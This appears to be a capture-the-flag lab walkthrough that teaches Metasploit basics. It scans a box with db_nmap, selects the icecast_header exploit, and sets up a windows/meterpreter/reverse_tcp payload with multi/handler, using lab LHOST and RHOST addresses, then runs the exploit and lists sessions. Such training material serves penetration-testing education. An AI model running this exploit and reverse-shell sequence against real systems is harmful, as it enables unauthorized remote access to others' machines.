# Task 5: Move that shell!

  
#1 Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 'db\_nmap -sV BOX-IP'  
  
  
#2 What service does nmap identify running on port 135?  
msrpc  
  
#3 Let's go ahead and see what information we have collected in the database. Try typing the command 'hosts' into the msfconsole now.  
  
#4 How about something else from the database, try the command 'services' now.  
  
#5 One last thing, try the command 'vulns' now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.   
  
#6 Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start.  
exploit/windows/http/icecast\_header  
  
#7 While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command 'search multi/handler'. What is the name of the column on the far left side of the console that shows up next to 'Name'? Go ahead and run the command 'use NUMBER\_NEXT\_TO exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.  
  
#8 Now type the command 'use NUMBER\_FROM\_PREVIOUS\_QUESTION'. This is the short way to use modules returned by search results.   
  
#9 Next, let's set the payload using this command 'set PAYLOAD windows/meterpreter/reverse\_tcp'. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command 'set LHOST YOUR\_IP\_ON\_TRYHACKME'. You might have to check your IP using the command 'ip addr', it will likely be your tun0 interface.  
set LHOST 10.8.30.58  
  
#10 Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.  
  
#11 One last step before we can run our exploit. Run the command 'set RHOST BOX\_IP' to tell Metasploit which target to attack.  
 set RHOST 10.10.209.12  
  
#12 Once you're set those variables correctly, run the exploit now via either the command 'exploit' or the command 'run -j' to run this as a job.  
  
#13 Once we've started this, we can check all of the jobs running on the system by running the command `jobs`  
  
#14 After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION\_NUMBER`

